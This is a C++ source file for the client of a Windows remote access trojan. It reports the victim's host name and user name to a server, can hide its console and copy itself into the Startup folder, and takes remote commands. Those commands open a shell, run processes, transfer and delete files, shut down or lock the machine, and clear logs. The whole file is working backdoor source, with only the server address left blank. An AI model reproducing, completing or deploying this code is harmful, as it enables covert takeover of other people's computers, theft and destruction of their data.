#include <iostream>
#include <windows.h>
#include <fstream>
#include <dirent.h>
#include <vector>
using namespace std;

const string SERVER = "";
const int PORT = 5005;

char buffer[1024];
const int TIMEOUT = 150000;

bool startup = false;
bool noConsole = false;

SOCKET objSocket;
string appdata = string(getenv("APPDATA"));
vector<string> fileLog;

// Linked Libraries
#include "ClientFunctions.cpp"

// Identify Operating System
#ifdef _WIN64
string OperatingSystem = "Windows 64-Bit";
#elif _WIN32
string OperatingSystem = "Windows 32-Bit";
#elif __linux__
string OperatingSystem = "Linux";
#else
string OperatingSystem = "Other";
#endif

void RegisterStartup()
{
    string startupPath = "C:/Users/" + (string)getenv("USERNAME") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";
    string fileName = __FILE__;

    fileName.erase(fileName.length() - 4);
    fileName = fileName + ".exe";
    startupPath += fileName;

    ifstream clientFile(startupPath);
    if (!clientFile.is_open()) { CopyFileA(fileName.data(), startupPath.data(), 0); }
}

int main()
{
    if (noConsole) ShowWindow(GetConsoleWindow(), SW_HIDE);
    if (startup) RegisterStartup();

    WSADATA wsdata;
    if (WSAStartup(MAKEWORD(2, 2), &wsdata) != 0) return EXIT_FAILURE;

    objSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (objSocket == SOCKET_ERROR) return EXIT_FAILURE;

    sockaddr_in client;
    client.sin_family = AF_INET;
    client.sin_port = htons(PORT);
    client.sin_addr.s_addr = inet_addr(SERVER.c_str());
    setsockopt(objSocket, SOL_SOCKET, SO_RCVTIMEO, (char*)&TIMEOUT, sizeof(TIMEOUT));

    if (connect(objSocket, (sockaddr*)&client, sizeof(client)) == SOCKET_ERROR) {
        closesocket(objSocket);
        WSACleanup(); main();
    }
    else {
        gethostname(buffer, sizeof(buffer));
        sendall((string)buffer + "|" + getenv("USERNAME") + "|" + OperatingSystem);
        memset(buffer, 0, sizeof(buffer));
    }

    while (true)
    {
        int check = recv(objSocket, buffer, sizeof(buffer), 0);
        if (check == 0 || check == SOCKET_ERROR) {
            clearLogs(); closesocket(objSocket);
            WSACleanup(); main();
        
        } string RemoteCommand = buffer;

        if (RemoteCommand == "terminate") {
            clearLogs(); closesocket(objSocket);
            WSACleanup(); exit(0);
        }
        else if (RemoteCommand == "messagebox") {
            vbsMessageBox(recvall(getBufferSize()));
        }
        else if (RemoteCommand == "wallpaper") {
            ChangeWallpaper(recvall(getBufferSize()));
        }
        else if (RemoteCommand == "startprocess") {
            StartProcess(recvall(getBufferSize()));
        }
        else if (RemoteCommand == "cmd") {
            RemoteCMD();
        }
        else if (RemoteCommand == "shutdown") {
            system("shutdown /p");
        }
        else if (RemoteCommand == "restart") {
            system("shutdown /r");
        }
        else if (RemoteCommand == "lock") {
            system("rundll32.exe user32.dll,LockWorkStation");
        }
        else if (RemoteCommand == "directory") {
            sendall(getcwd(buffer, sizeof(buffer)));
        }
        else if (RemoteCommand == "viewfiles") {
            ViewFiles(recvall(getBufferSize()));
        }
        else if (RemoteCommand == "receivefile") {
            SendFile(recvall(getBufferSize()));
        }
        else if (RemoteCommand == "sendfile") {
            ReceiveFile(recvall(getBufferSize()));
        }
        else if (RemoteCommand == "deletefile") {
            DelFile(recvall(getBufferSize()));
        }
        else if (RemoteCommand == "deletedirectory") {
            DelDirectory(recvall(getBufferSize()));
        }

        // Clear Buffer
        memset(buffer, 0, sizeof(buffer));
    }
}
